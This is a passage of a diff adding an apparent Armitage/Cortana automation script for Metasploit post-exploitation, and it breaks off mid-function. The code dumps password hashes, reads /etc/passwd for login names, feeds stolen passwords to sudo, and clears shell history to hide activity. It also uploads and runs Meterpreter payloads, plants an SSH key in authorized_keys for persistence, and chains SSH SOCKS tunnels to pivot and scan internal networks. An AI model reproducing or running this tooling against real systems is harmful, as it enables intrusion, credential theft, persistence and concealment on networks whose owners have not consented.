+				#post("linux/gather/pptpd_chap_secrets", $session );
+				
+				#....................................................................
+				# store_loot
+				# These store output in loot, this is ok..
+				# but we need to read the loot later and interpret the output into our wordlists
+				#post("multi/gather/firefox_creds", $session );
+				#post("multi/gather/pidgin_cred", $session );
+				#post("multi/gather/thunderbird_creds", $session );
+				#post("multi/gather/netrc_creds", $session );
+				#post("multi/gather/fetchmailrc_creds", $session );
+				#post("multi/gather/gpg_creds", $session );
+			
+			}
+		}
+	}
+	if (-ismeterpreter $session) {
+	
+		# only pivot over a meterpreter session if its a windows payload
+		# this is because it will crash on a linux/java payload
+		if( $autopivot eq "1" && "windows" isin $viapayload ){
+			m_cmd($session, "route", &autopivot_route);
+		}
+	
+		if ( "linux" isin $viapayload ) {
+			println("new linux meterpreter session opened on $session");
+			#println("DEBUG: " . $2);
+			
+			if( $postExploitation eq "1" ){
+				#....................................................................
+				# report_auth_info
+				# These store output into creds, this is the most awesome
+				
+				#post("multi/gather/ssh_creds", $session );
+				#post("multi/gather/pgpass_creds", $session );
+				#post("multi/gather/filezilla_client_cred", $session );
+				#post("linux/gather/pptpd_chap_secrets", $session );
+				
+				#....................................................................
+				# store_loot
+				# These store output in loot, this is ok..
+				# but we need to read the loot later and interpret the output into our wordlists
+				
+				#post("multi/gather/firefox_creds", $session );
+				#post("multi/gather/pidgin_cred", $session );
+				#post("multi/gather/thunderbird_creds", $session );
+ 			}
+			
+		}
+		if ( "windows" isin $viapayload ) {
+			#println("\c5DEBUG new windows meterpreter session opened on $session");
+			#println("DEBUG: " . $2);
+			
+			# get a list of users and update the $creds_usernames file
+			get_smb_users($session);
+			
+			# how can we get admin/system? - do we need to?
+			
+			
+			if( $postExploitation eq "1" ){
+
+				# dump hashes
+				post("windows/gather/smart_hashdump", $session, %(GETSYSTEM => 1) );
+			
+				#....................................................................
+				# report_auth_info
+				# These store output into creds, this is the most awesome
+				
+				#post("windows/gather/credentials/bulletproof_ftp", $session );
+				#post("windows/gather/credentials/coreftp", $session );
+				#post("windows/gather/credentials/credential_collector", $session );
+				#post("windows/gather/credentials/enum_cred_store", $session );
+				#post("windows/gather/credentials/epo_sql", $session );
+				#post("windows/gather/credentials/filezilla_server", $session );
+				#post("windows/gather/credentials/flashfxp", $session );
+				#post("windows/gather/credentials/ftpnavigator", $session );
+				#post("windows/gather/credentials/ftpx", $session );
+				#post("windows/gather/credentials/gpp", $session );
+				#post("windows/gather/credentials/mremote", $session );
+				#post("windows/gather/credentials/outlook", $session );
+				#post("windows/gather/credentials/razer_synapse", $session );
+				#post("windows/gather/credentials/razorsql", $session );
+				#post("windows/gather/credentials/smartftp", $session );
+				#post("windows/gather/credentials/spark_im", $session );
+				#post("windows/gather/credentials/tortoisesvn", $session );
+				#post("windows/gather/credentials/total_commander", $session );
+				#post("windows/gather/credentials/vnc", $session );
+				#post("windows/gather/credentials/winscp", $session );
+				#post("windows/gather/credentials/wsftp_client", $session );
+				#post("windows/gather/enum_snmp", $session );
+				
+				#post("multi/gather/filezilla_client_cred", $session );
+				#post("multi/gather/pgpass_creds", $session );
+
+				#....................................................................
+				# store_loot
+				# These store output in loot, this is ok..
+				# but we need to read the loot later and interpret the output into our wordlists
+				
+				# browsers
+				#post("windows/gather/enum_ie", $session );	
+				#post("windows/gather/enum_chrome", $session );	
+				#post("multi/gather/firefox_creds", $session );
+				
+				# email
+				#post("multi/gather/thunderbird_creds", $session );
+				
+				#post("windows/gather/cachedump", $session );
+				#post("windows/gather/credentials/dyndns", $session );
+				#post("windows/gather/credentials/enum_picasa_pwds", $session );
+				#post("windows/gather/credentials/idm", $session );
+				#post("windows/gather/credentials/imail", $session );
+				#post("windows/gather/credentials/imvu", $session );
+				#post("windows/gather/credentials/meebo", $session );
+				#post("windows/gather/credentials/nimbuzz", $session );
+				#post("windows/gather/credentials/steam", $session );
+				#post("windows/gather/credentials/trillian", $session );
+				#post("windows/gather/credentials/windows_autologin", $session );
+				#post("windows/gather/enum_unattend", $session );
+				#post("windows/gather/enum_tomcat", $session );			
+				#post("multi/gather/gpg_creds", $session );
+				#post("multi/gather/pidgin_cred", $session );
+			}
+
+		}
+	}
+}
+
+command test_cat_passwd {
+	s_cmd($1, "cat /etc/passwd");
+}
+
+on shell_cat {
+	local('$session $cmd $output $line @passwd $user $shell @validusers');
+	$session = $1;
+	$cmd = $2;
+	$output = $3;
+	
+	if( "cat /etc/passwd" eq $cmd ){
+		# check that cat did not report an error message
+		if( "cat: /etc/passwd" !isin $output ){
+			# split the output into lines and iterate over each line
+			@passwd = split('\n', $output);
+			foreach $line (@passwd) {
+				# ignore lines that start with #
+				if( $line !ismatch '^#.*' ){
+					$user = substr($line, 0, indexOf($line, ":") );
+					$shell = substr($line, lindexOf($line, ":") + 1 );
+					
+					# check that the shell for this user is not in the blacklisted_shells variable
+					# this should make sure we only select user accounts that we can login to
+					if( $shell !in @blacklisted_shells ) {
+						# now add the user to our list of valid usernames
+						add(@validusers, $user);
+					}
+				}
+			}
+			update_username_file(@validusers);
+		}
+	}
+	if( "cat ~/.ssh/authorized_keys" eq $cmd ){
+		autopivot_ssh_checkkeys($session, $output);
+	}
+}
+
+on shell_unset {
+	local('$passfromsession $session $cmd $output');
+	$session = $1;
+	$cmd = $2;
+	$output = $3;
+	
+	#println("\c5DEBUG: [ $+ $session $+ ] unset [ $+ $cmd $+ ] returns: \c0[ $+ $output $+ ]");
+	
+	if( " is not in the sudoers file." isin $output ){
+		println("Cant get root on session $session");
+		
+		# now upload sucrack and wordlist of all known passwords etc
+	}
+	
+	
+	# if this is the result from the last sudo command, then send the password, and get the current id
+	if ( "sudo -S id" isin $cmd ) {
+	
+		if( "uid=0(" isin $output ) {
+			#println("\c9 DEBUG: We are root on session [ $+ $session $+ ] ");
+		}
+		else {
+			# get the password from the session info
+			$passfromsession = get_pass_from_session_id($session);
+			if ( $passfromsession ne "login_autopwn.something.went.wrong" ) {
+		
+				# first password attempt at sudo
+				s_cmd($session, "$passfromsession");
+			}
+			
+			# now this one should actually work and give valid output for the id command
+			s_cmd($session, "id");
+		}
+	}
+}
+
+on shell_id {
+	local('$session $cmd $output');
+	$session = $1;
+	$cmd = $2;
+	$output = $3;
+	
+	if($debug != 0){
+		println("\c9DEBUG: [ $+ $session $+ ] id [ $+ $cmd $+ ] returns: \c0[ $+ $output $+ ]");
+	}
+	
+	# delete the shell script with the plaintext password and clear shell history
+	s_cmd($session, "rm -f /tmp/login_autopwn_sudoaskpass-* ; history -c");
+	
+	
+	if( "uid=0(" isin $output ) {
+		if($debug != 0){
+			println("\c9 DEBUG: We are root on session [ $+ $session $+ ] ");
+		}
+	}
+	
+	if($debug != 0){
+		println("DEBUG: [ $+ $session $+ ] Now getting hashes...");
+	}
+	# now lets get hashes
+#
+# need to add something to check if linux then run linux hashdump, if not then run aix/unix/mac osx hashdump?
+#
+
+#	post("linux/gather/hashdump", $session);
+#	post("aix/hashdump", $1);
+#	post("osx/gather/hashdump", $1);
+#	post("solaris/gather/hashdump", $1);
+	
+}
+on shell_whereis {
+	local('$session $cmd $output $randname $payload $filehandle $pivotpayload $pivotport $hasjava %options $ssh_tunnel_port');
+	$session = $1;
+	$cmd = $2;
+	$output = $3;
+	
+	if($debug != 0){
+		println("DEBUG: Session [ $+ $session $+ ] whereis java: $output");
+	}
+
+	# only continue if we can find something in the output of "whereis java"
+	if( "java: /" isin $output && "/bin/" isin $output){
+		# create a random name of 5 random number between 0 and 10, ex. 15426
+		$randname = "msfpayload-" . rand(10) . rand(10) . rand(10) . rand(10) . rand(10) . "";
+		
+		if($debug != 0){
+			println("\c8DEBUG session " . $session . " has info " . session_host($session) );
+		}
+		
+		if( !is_in_my_network( session_host($session) ) ){
+		
+			if($debug != 0){
+				println("\c8DEBUG session is not in my network, using pivotpayload");
+			}
+			$pivotpayload = $javapayload_pivot;
+			$pivotport = random_port();
+			$payload = generate($pivotpayload, session_data($session)['host'], $pivotport, %(), "raw");
+		}
+		else {
+			$payload = generate($javapayload, lhost(), $javaport, %(), "raw");
+		}
+		
+		$filehandle = openf(">" . script_resource($randname));
+		writeb($filehandle, $payload);
+		closef($filehandle);
+
+		# upload the generated payload
+		shell_upload($session, script_resource($randname) , "/tmp/$randname");
+		# run the payload
+		s_cmd($session, "nohup java -jar /tmp/$randname &");
+		
+		# if we need to pivot then launch the handler to connect to the pivot bind shell
+		if( !is_in_my_network( session_host($session) ) ){
+			# sleep and wait for the payload to run before trying to connect to it
+			sleep(2 * 1000);
+			
+			if( is_over_ssh_tunnel( session_host($session) ) ){
+				$ssh_tunnel_port = get_ssh_tunnel_for_ip( session_host($session) );
+				wait_for_tunnel($ssh_tunnel_port);
+				%options['Proxies'] = "socks4:127.0.0.1:" . $ssh_tunnel_port;
+			}
+			
+			%options['ExitOnSession'] = 'false';
+			%options['PAYLOAD'] = $pivotpayload;
+			%options['RHOST'] = session_host($session);
+			%options['LPORT'] = $pivotport;
+			%options['ListenerTimeout'] = $ListenerTimeout;
+			%options['WfsDelay'] = $WfsDelay;
+			
+			launch("exploit", "multi/handler", %options);
+		}
+		
+		# delete the locally stored payload
+		deleteFile(script_resource($randname));
+	}
+	# if there no java, then lets default to elf meterpreter payload
+	else {
+		s_cmd($session, "uname -m");
+		# execution will continue at on shell_uname
+	}
+}
+
+
+on shell_uname {
+	local('$session $cmd $output $randname $payload $filehandle $pivotpayload $pivotport $isjava %options $ssh_tunnel_port');
+	$session = $1;
+	$cmd = $2;
+	$output = $3;
+	
+	println("DEBUG: Session [ $+ $session $+ ] uname: $output");
+
+	# create a random name of 5 random number between 0 and 10, ex. 15426
+	$randname = "msfpayload-" . rand(10) . rand(10) . rand(10) . rand(10) . rand(10) . "";
+
+	# x86_64 - 64bit
+	if( "x86_64" isin $output ){
+		if($debug != 0){
+			println("DEBUG: No meterpreter support for 64 bit");
+		}
+	}
+	
+	# x86 - 32bit
+	if( "i686" isin $output ){
+	
+		if($debug != 0){
+			println("\c8DEBUG session " . $session . " has host " . session_host($session) );
+		}
+		
+		# if this is a shell over pivot then use a bind payload
+		if( !is_in_my_network( session_host($session) ) ){
+			if($debug != 0){
+				println("\c8DEBUG session is not in my network, using pivotpayload");
+			}
+			$pivotpayload = $linuxpayload_pivot;
+			$pivotport = random_port();
+			$payload = generate($pivotpayload, session_host($session), $pivotport, %(), "elf");
+		}
+		else {
+			$payload = generate($linuxpayload, lhost(), $linuxport, %(), "elf");
+		}
+		
+		$filehandle = openf(">" . script_resource($randname));
+		writeb($filehandle, $payload);
+		closef($filehandle);
+
+		# upload the generated payload
+		shell_upload($session, script_resource($randname) , "/tmp/$randname");
+		#
+		# THERE HAS TO BE A MORE ELEGANT SOLUTION OTHER THAN WAITING 2 SECONDS.. ffs...
+		#
+		#
+		#sleep(2 * 1000);
+		#
+		# while loop, run ls and catch the output, verify it was running ls /tmp/$randname, maybe check the filesize
+		#
+
+		#println("DEBUG: MSF payload is /tmp/" . $randname);
+
+		s_cmd($session, "chmod a+x /tmp/$randname");
+		s_cmd($session, "nohup /tmp/$randname &");
+		
+		# if we need to pivot then launch the handler to connect to the pivot bind shell
+		if( !is_in_my_network( session_host($session) ) ){
+			# sleep and wait for the payload to run before trying to connect to it
+			sleep(2 * 1000);
+			
+			if( is_over_ssh_tunnel( session_host($session) ) ){
+				$ssh_tunnel_port = get_ssh_tunnel_for_ip( session_host($session) );
+				wait_for_tunnel($ssh_tunnel_port);
+				%options['Proxies'] = "socks4:127.0.0.1:" . $ssh_tunnel_port;
+			}
+			
+			%options['ExitOnSession'] = 'false';
+			%options['PAYLOAD'] = $pivotpayload;
+			%options['RHOST'] = session_host($session);
+			%options['LPORT'] = $pivotport;
+			%options['ListenerTimeout'] = $ListenerTimeout;
+			%options['WfsDelay'] = $WfsDelay;
+			
+			launch("exploit", "multi/handler", %options);
+		}
+		
+		
+		# delete the locally stored payload
+		deleteFile(script_resource($randname));
+	}
+}
+
+command upgrade_linux_shell_to_meterpreter {
+	if( -isshell $1 ){
+		println("Upgrading shell session $1 to meterpreter");
+		if( $preferjavapayload eq "1" ){
+			s_cmd($1, "whereis java");
+			# execution will continue at on shell_whereis
+		}
+		else {
+			s_cmd($1, "uname -m");
+			# execution will continue at on shell_uname
+		}
+	}
+	else {
+		println("Cant upgrade a meterpreter session to a meterpreter session");
+	}
+}
+
+command upgrade_windows_shell_to_meterpreter {
+	if( -isshell $1 ){
+		println("Upgrading windows shell session $1 to meterpreter");
+		
+		$upgrade_console = open_console_tab("upgrade shell");
+		# setg LPORT this is the handler port for the upgrade
+		cmd($upgrade_console, "set LPORT $winportupgrade");
+		cmd($upgrade_console, "show options");
+		cmd($upgrade_console, "sleep 10");
+		# sessions -u $1
+		cmd($upgrade_console, "sessions -u $session");
+	}
+	else {
+		println("Cant upgrade a meterpreter session to a meterpreter session");
+	}
+}
+
+###############################################################################
+# Pivot
+###############################################################################
+# check that ssh server is running
+# check for ssh client
+
+command get_listening_ports {
+	println("listening ports = " . get_listening_ports() );
+}
+
+sub get_listening_ports {
+	local('$process @data $x @output $port @netstat_ports');
+	
+	# get netstat and get for "pid/ssh"
+	$process = exec("netstat -tunap");
+	@data = readAll($process);
+	closef($process);
+	
+	# put all the lines that include "LISTEN" into @output
+	for( $x = 0; $x < size(@data); $x++){
+		if( "LISTEN" isin @data[$x] ) {
+			add(@output, @data[$x] );
+		}
+	}
+	clear(@data);
+	
+	for( $x = 0; $x < size(@output); $x++){
+		@data = split(' ', @output[$x]);
+		removeAll(@data, @("") );
+		# take the column that contains the listening ip:port
+		# extract the port number
+		$port = substr(@data[3], lindexOf(@data[3], ":") + 1 );
+		add(@netstat_ports, $port );
+	}
+	return @netstat_ports;
+}
+
+command get_ssh_tunnel_active_ports {
+	println("active ssh tunnel ports = " . get_ssh_tunnel_active_ports() );
+}
+
+sub get_ssh_tunnel_active_ports {
+	local('$process @data @output $x $y @ssh_ports @netstat_ports @listen_ports');
+
+	# get ps output and look for $key_location
+	$process = exec("ps uaxwwww");
+	@data = readAll($process);
+	closef($process);
+	
+	# put all the lines that include our ssh key into @output
+	for( $x = 0; $x < size(@data); $x++){
+		if( $key_location isin @data[$x] ) {
+			add(@output, @data[$x] );
+		}
+	}
+	# clear the other ps output that we dont need
+	clear(@data);
+	
+	for( $x = 0; $x < size(@output); $x++){
+		@data = split(' ', @output[$x]);
+		removeAll(@data, @("") );
+		
+		# search for -D then get the port number
+		for( $y = 0; $y < size(@data); $y++){
+			if( "-D" eq @data[$y] ){
+				add(@ssh_ports, @data[$y + 1]);
+			}
+		}
+	}
+	clear(@output);
+	
+	@netstat_ports = get_listening_ports();
+	
+	# search through @netstat_ports and try to find all the @ssh_ports
+	# when we find it then add it to @listen_ports
+	for( $x = 0; $x < size(@netstat_ports); $x++){
+		for( $y = 0; $y < size(@ssh_ports); $y++){		
+			if( @ssh_ports[$y] eq @netstat_ports[$x] ) {
+			
+				if( @ssh_ports[$y] !in @listen_ports ){
+					add(@listen_ports, @ssh_ports[$y] );
+				}
+			}
+		}
+	}
+	
+	return @listen_ports;
+}
+
+command is_ssh_tunnel_ready {
+	is_ssh_tunnel_ready($1);
+}
+
+sub is_ssh_tunnel_ready {
+	local('$dport @listen_ports');
+	$dport = $1;
+	@listen_ports = get_ssh_tunnel_active_ports();
+	
+	# check if $dport in @listen_ports
+	if( $dport in @listen_ports ){
+		return true;
+	}
+	else {
+		return false;
+	}
+}
+
+command wait_for_tunnel {
+	wait_for_tunnel($1);
+}
+
+sub wait_for_tunnel {
+	local('$dport $x $timeout');
+	$dport = $1;
+	
+	# wait for 30 seconds
+	$timeout = 10;
+	
+	$x = 0;
+	while( !is_ssh_tunnel_ready($dport) ) {
+	
+		if($debug != 0){
+			println("\c6waiting $x");
+		}
+		
+		# wait for 1 second
+		sleep(1 * 1000);
+		# increment $x
+		$x++;
+		if( $x > $timeout ){
+			println("\c5ERROR timeout when waiting for ssh tunnel to start");
+			break;
+		}
+	}
+	
+	# wait for 2 seconds
+	sleep(2 * 1000);
+}
+
+#on console {
+#	println("\c3DEBUG console cmd $2");
+#	println("\c3DEBUG console output  $3");
+#}
+
+command update_proxychains {
+	update_proxychains($1);
+}
+
+sub update_proxychains {
+	local('$port $proxychains_conf $error $file_handle');
+	$port = $1;
+	$proxychains_conf = script_resource("proxychains.conf");
+	
+	# check that the file exists and we can read/write to it
+	if (!-exists $proxychains_conf && !-isFile $proxychains_conf && !-canread $proxychains_conf && !-canwrite $proxychains_conf ) {
+		createNewFile($proxychains_conf);
+		if (checkError($error)) { 
+			println("\c5[-] Could not create proxychains config at  [" . $proxychains_conf . "]: $error");
+		}
+	}
+	
+	# DEBUG
+	#println("\c9[+] Using proxychains config file at [" . $proxychains_conf . "]");
+	#
+	
+	# open the file
+	$file_handle = openf(">" . $proxychains_conf);
+	if (checkError($error)) {
+		println("\c4Could not open file: $error");
+	}
+	
+	# write a default proxychains config and then add our socks proxy
+	println($file_handle, "strict_chain");
+	println($file_handle, "quiet_mode");
+	println($file_handle, "proxy_dns");
+	println($file_handle, "tcp_read_time_out 15000");
+	println($file_handle, "tcp_connect_time_out " . $portscan_timeout );
+	println($file_handle, "[ProxyList]");
+	println($file_handle, "socks4 127.0.0.1 " . $port );
+	
+	# close the file
+	closef($file_handle);
+}
+
+command get_ssh_tunnel_for_ip {
+	println( get_ssh_tunnel_for_ip($1) );
+}
+
+sub get_ssh_tunnel_for_ip {
+	local('$ip $x %routelist @used $find $tunnel_port');
+	$ip = $1;
+	
+	if($debug != 0){
+		println("\c2DEBUG finding ssh tunnel for " . $ip);
+	}
+	
+	# check if $ip is available over a ssh tunnel
+	for( $x = 0; $x < size(@ssh_tunnels); $x++){
+		%routelist = @ssh_tunnels[$x];
+		if( is_in_network($ip, %routelist['network'], %routelist['mask']) ){
+			
+			#
+			# this is where we check that the tunnel is up and ready to be used
+			#
+			
+			add(@used, %routelist['used'] );
+		}
+	}
+	
+	sortn(@used);
+	$find = @used[0];
+	
+	for( $x = 0; $x < size(@ssh_tunnels); $x++){
+		%routelist = @ssh_tunnels[$x];
+		if( is_in_network($ip, %routelist['network'], %routelist['mask']) ){
+			
+			if( %routelist['used'] eq $find ) {
+				$tunnel_port = %routelist['dport'];
+				
+				# remove old info
+				removeAt(@ssh_tunnels, $x);
+				# add new info
+				%routelist['used'] = %routelist['used'] + 1;
+				add(@ssh_tunnels, %routelist);
+				
+				# now exit from the for loop
+				break;
+			}
+		}
+	}
+	
+	if($debug != 0){
+		println("\c2DEBUG $ip is available through ssh tunnel socks4:127.0.0.1:" . $tunnel_port );
+	}
+	
+	return $tunnel_port;
+}
+
+# the old random tunnel selection
+#sub get_ssh_tunnel_for_ip {
+#	local('$ip $x %routelist @tunnel_ports $random_tunnel_port');
+#	$ip = $1;
+#	
+#	println("\c2DEBUG finding ssh tunnel for " . $ip);
+#	
+#	# check if $ip is available over a ssh tunnel
+#	for( $x = 0; $x < size(@ssh_tunnels); $x++){
+#		%routelist = @ssh_tunnels[$x];
+#		if( is_in_network($ip, %routelist['network'], %routelist['mask']) ){
+#			
+#			#
+#			# this is where we check that the tunnel is up and ready to be used
+#			#
+#			
+#			add(@tunnel_ports, %routelist['dport'] );
+#		}
+#	}
+#	# now get a random item from the list of available ports
+#	$random_tunnel_port = rand(@tunnel_ports);
+#	
+#	println("\c2DEBUG $ip is available through ssh tunnel socks4:127.0.0.1:" . $random_tunnel_port );
+#	
+#	return $random_tunnel_port;
+#}
+
+command is_over_ssh_tunnel {
+	if( is_over_ssh_tunnel($1) ){
+		println("we have a route to this ip");
+	}
+	else {
+		println("we DONT have a route to this ip");
+	}
+}
+
+sub is_over_ssh_tunnel {
+	local('$ip $return $x %routelist');
+	$ip = $1;
+	$return = false;
+	
+	# check if $ip is only available over a ssh tunnel
+	for( $x = 0; $x < size(@ssh_tunnels); $x++){
+		%routelist = @ssh_tunnels[$x];
+		if( is_in_network($ip, %routelist['network'], %routelist['mask']) ){
+			$return = true;
+		}
+	}
+	
+	return $return;
+}
+
+command clear_ssh_tunnels_info {
+	clear(@ssh_tunnels);
+}
+
+command dump_ssh_tunnels_info {
+	dump_ssh_tunnels_info();
+}
+
+sub dump_ssh_tunnels_info {
+	local('$x');
+	println("\c7Session\t| Network\t| Mask\t\t| DPORT\t| RHOST\t\t| RPORT\t| Key\t| Start\t| Used\t| User\t");
+	for( $x = 0; $x < size(@ssh_tunnels); $x++){
+		println("\c7" . @ssh_tunnels[$x]['session'] . "\t| " . @ssh_tunnels[$x]['network'] . "\t| " . @ssh_tunnels[$x]['mask'] . "\t| " . @ssh_tunnels[$x]['dport'] . "\t| " . @ssh_tunnels[$x]['rhost'] . "\t| " . @ssh_tunnels[$x]['rport'] . "\t| " . @ssh_tunnels[$x]['haskey'] . "\t| " . @ssh_tunnels[$x]['started'] . " \t| " . @ssh_tunnels[$x]['used'] . "\t| " . @ssh_tunnels[$x]['user'] );
+	}
+}
+
+command add_ssh_tunnel {
+	add_ssh_tunnel($1);
+}
+
+sub add_ssh_tunnel {
+	local('$line @temp @add $x %new');
+	$line = $1;
+	
+	#$line = "21|10.1.1.0|255.255.255.0|16363|192.168.1.50|22|1|1|1|vyatta";
+	
+	@add = split('\|', $line);
+	if( size(@add) > 0 ){
+		%new['session'] = @add[0];
+		%new['network'] = @add[1];
+		%new['mask']	= @add[2];
+		%new['dport']	= @add[3];
+		%new['rhost']	= @add[4];
+		%new['rport']	= @add[5];
+		%new['haskey']	= @add[6];
+		%new['started']	= @add[7];
+		%new['used']	= @add[8];
+		%new['user']	= @add[9];
+		add(@ssh_tunnels, %new);
+	}
+	dump_ssh_tunnels_info();
+}
+
+command autopivot_ssh {
+	autopivot_ssh($1);
+}
+
+sub autopivot_ssh {
+	local('$session $process @data $filehandle $key $socks_port $port $username $rhost');
+	$session = $1;
+	
+	# check that $session is a shell session
+	if( -isshell $session ){
+		if($debug != 0) {
+			println("Setting up SSH socks proxy on shell session $session");
+		}
+		# get the list of networks available on that session
+		s_cmd($session, "/sbin/route -n");
+		# execution continues at on shell_/sbin/route
+	}
+	else {
+		println("Cant setup a SSH socks proxy with a meterpreter session");
+	}
+}
+
+on shell_/sbin/route {
+	local('$session $cmd $output @outputlines @clean $line $x $dest $mask %routelist $new_network');
+	$session = $1;
+	$cmd = $2;
+	$output = $3;
+	
+	#println("\c8DEBUG route output is $output");
+	
+	if( "/sbin/route -n" eq $cmd ){
+		
+		# split the output into a line by line array
+		@outputlines = split('\n', $output);
+		foreach $line (@outputlines) {
+			if( size($line) > 0 ){
+				# remove the newline character from the end of each line
+				$line = substr($line, 0, size($line) - 1 );
+			}
+		}
+		# remove the first two header lines
+		removeAt(@outputlines, 0);
+		removeAt(@outputlines, 0);
+		
+		for( $x = 0 ; $x < size(@outputlines); $x++ ){
+			@clean = split(' ', @outputlines[$x]);
+			# remove the spaces inbetween the info we want
+			removeAll(@clean, @('') );
+			
+			$dest = @clean[0];
+			$mask = @clean[2];
+			
+			# ignore destinations that start with 0, 127, 255, 169, 
+			if( $dest !ismatch '^127\..*|^0\..*|^255\..*|^169\..*'){
+				# check that we don't have a route to this network
+				if( !is_in_my_network($dest) && !have_route($dest, $mask) ){
+					
+					if($debug != 0) {
+						println("\c5DEBUG new route dest = \[$dest\] with mask = \[$mask\]");
+					}
+					
+					%routelist['session'] = $session;
+					%routelist['network'] = $dest;
+					%routelist['mask'] = $mask;
+					
+					# store the rhost, rport, username
+					# info => 'SSH root:password (192.168.1.51:22)'
+					%routelist['rhost'] = session_data($session)['host'];
+					%routelist['rport'] = substr(session_data($session)['info'], lindexOf(session_data($session)['info'], ":") + 1, strlen(session_data($session)['info']) - 1 );
+					%routelist['user'] = substr(session_data($session)['info'], 4, indexOf(session_data($session)['info'], ":") );
+					
+					# mark this tunnel as not being started
+					%routelist['started'] = "0";
+					
+					# mark this tunnel as never been used
+					%routelist['used'] = "0";
+					
+					# store the route info in the global ssh_routes array
+					add(@ssh_tunnels, %routelist);
+					
+					if($debug != 0){
+						println("\c5DEBUG now checking authorized_keys on session $session");
+					}
+					# this will continue at on shell_cat and then pass the output to autopivot_ssh_checkkeys
+					s_cmd($session, "cat ~/.ssh/authorized_keys");
+				}
+			}
+		}
+		
+		clear(@clean);
+		clear(@outputlines);
+		clear(%routelist);
+	}
+}
+
+sub autopivot_ssh_checkkeys {
+	local('$session $output $key_installed @outputlines $line $filehandle $key $dport $x %routelist');
+	$session = $1;
+	$output = $2;
+	
+	# println("\c5DEBUG session $session authorized_keys is " . $output );
+	
+	# read in the ssh public key as $key
+	$filehandle = openf($key_location_pub);
+	$key = readln($filehandle);
+	closef($filehandle);
+	
+	# search through the output and find our ssh key
+	$key_installed = 0;
+	
+	@outputlines = split('\n', $output);
+	removeAll(@outputlines, @('') );
+	foreach $line (@outputlines) {
+		if( strlen($line) > 0 ){
+			if( $line eq $key ){
+				$key_installed = 1;
+			}
+		}
+	}
+	
+	# update the ssh_tunnels array with the key status
+	for( $x = 0; $x < size(@ssh_tunnels); $x++){
+		%routelist = @ssh_tunnels[$x];
+		if( %routelist['session'] eq $session ) {
+			# remove the old info
+			removeAt(@ssh_tunnels, $x);
+			
+			# add the new info
+			%routelist['haskey'] = $key_installed;
+			add(@ssh_tunnels, %routelist);
+		}
+	}
+	
+	if( $key_installed eq 0 ){
+		println("\c2key is missing");
+		# update the session's user with our ssh key
+		# this will continue at on shell_mkdir which passes the session id to autopivot_ssh_tunnel
+		s_cmd($session, "mkdir ~/.ssh ; chmod 700 ~/.ssh ; echo \"$key\" >> ~/.ssh/authorized_keys ; chmod 600 ~/.ssh/authorized_keys");
+	}
+	else {
+		# if the key is already on the host then jump to autopivot_ssh_tunnel to setup the tunnel
+		autopivot_ssh_tunnel($session);
+	}
+}
+
+on shell_mkdir {
+	local('$session $cmd $output @outputlines @clean $line $x $dest $mask %routelist $new_network');
+	$session = $1;
+	$cmd = $2;
+	$output = $3;
+	
+	if( $cmd ismatch 'mkdir ~/.ssh ; chmod 700 ~/.ssh ; echo .* >> ~/.ssh/authorized_keys ; chmod 600 ~/.ssh/authorized_keys'){
+		println("\c2 win, key is installed on session \[" . $session . "\] - " . $output);
+		autopivot_ssh_tunnel($session);
+	}
+}
+
+sub autopivot_ssh_tunnel {
+	local('$session $x %routelist $dport $ssh_tunnel_port $console $tunnels_started @new_ssh_tunnels %temp_routelist');
+	$session = $1;
+		
+	for( $x = 0; $x < size(@ssh_tunnels); $x++){
+		%routelist = @ssh_tunnels[$x];
+		if( %routelist['session'] eq $session && %routelist['started'] eq "0") {
+					
+			# remove the old info
+			removeAt(@ssh_tunnels, $x);
+			
+			# continue until we have started enough tunnels as configured in $ssh_tunnels_num
+			$tunnels_started = size(@new_ssh_tunnels);
+			while( $tunnels_started < $ssh_tunnels_num ){
+			
+				%temp_routelist = copy(%routelist);
+				
+				$dport = random_port();
+				while( $dport in get_listening_ports() ){
+					if($debug != 0){
+						println("\cBDEBUG port $dport is being used, getting another");
+					}
+					$dport = random_port();
+				}
+
+				# now run the ssh client to setup a socks proxy with the following options
+				# -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no don't check the host key
+				# -o ExitOnForwardFailure=yes exit if we can't forward the ports
+				# -o BatchMode=yes
+				# -C enable compression
+				# -f fork the process
+				# -N do not execute a remote command
+				# -i the ssh key to use
+				# -D <port> is the port to listen on for the socks proxy
+				# -p <port> remote ssh service port
+				# -l <username> is the user to login as
+				# first we have to check if we need to use a proxy
+				# because we might want to pivot over a pivot
+				if( is_over_ssh_tunnel( %temp_routelist['rhost'] ) ){
+					
+					#println("\c8DEBUG ssh tunnel for " . %temp_routelist['rhost'] . " is on port " . get_ssh_tunnel_for_ip(%temp_routelist['rhost']) );
+					#println("\c7DEBUG (over " . get_ssh_tunnel_for_ip(%temp_routelist['rhost']) . ") proxychains ssh ... -D $dport -p " . %temp_routelist['rport'] . " -l " . %temp_routelist['user'] . " " . %temp_routelist['rhost'] . " > /dev/null 2>&1");
+					
+					$ssh_tunnel_port = get_ssh_tunnel_for_ip(%temp_routelist['rhost']);
+					wait_for_tunnel($ssh_tunnel_port);
+					# update the proxychains config file to use our ssh tunnel
+					update_proxychains($ssh_tunnel_port);
+					
+					$console = console();
+					cmd($console, "cd " . script_resource("/") );
+					cmd($console, "proxychains ssh -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no -o ExitOnForwardFailure=yes -o BatchMode=yes -C -f -N -i $key_location -D $dport -p " . %temp_routelist['rport'] . " -l " . %temp_routelist['user'] . " " . %temp_routelist['rhost'] . " > /dev/null 2>&1 &");
+					cmd_stop($console);
+				}
+				else {
+					
+					#println("\c7DEBUG (over local socks proxy) proxychains ssh ... -D $dport -p " . %temp_routelist['rport'] . " -l " . %temp_routelist['user'] . " " . %temp_routelist['rhost'] );
+				
+					# lets use our socks proxy and run ssh over it
+					update_proxychains( $socks_proxy_port );
+					
+					$console = console();
+					cmd($console, "cd " . script_resource("/") );
+					cmd($console, "proxychains ssh -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no -o ExitOnForwardFailure=yes -o BatchMode=yes -C -f -N -i $key_location -D $dport -p " . %temp_routelist['rport'] . " -l " . %temp_routelist['user'] . " " . %temp_routelist['rhost'] . " > /dev/null 2>&1 &");
+					cmd_stop($console);
+				}
+				
+				# add the new info
+				%temp_routelist['dport'] = $dport;
+				%temp_routelist['started'] = "1";
+				add(@new_ssh_tunnels, %temp_routelist);
+				
+				$tunnels_started = size(@new_ssh_tunnels);
+			}
+		
+			# add all the new tunnels to the ssh_tunnels array
+			addAll(@ssh_tunnels, @new_ssh_tunnels);
+			
+			# now start a portscan
+			scan(%routelist['network'] . "/" . %routelist['mask']);
+		}
+	}
+}
+
+command autopivot {
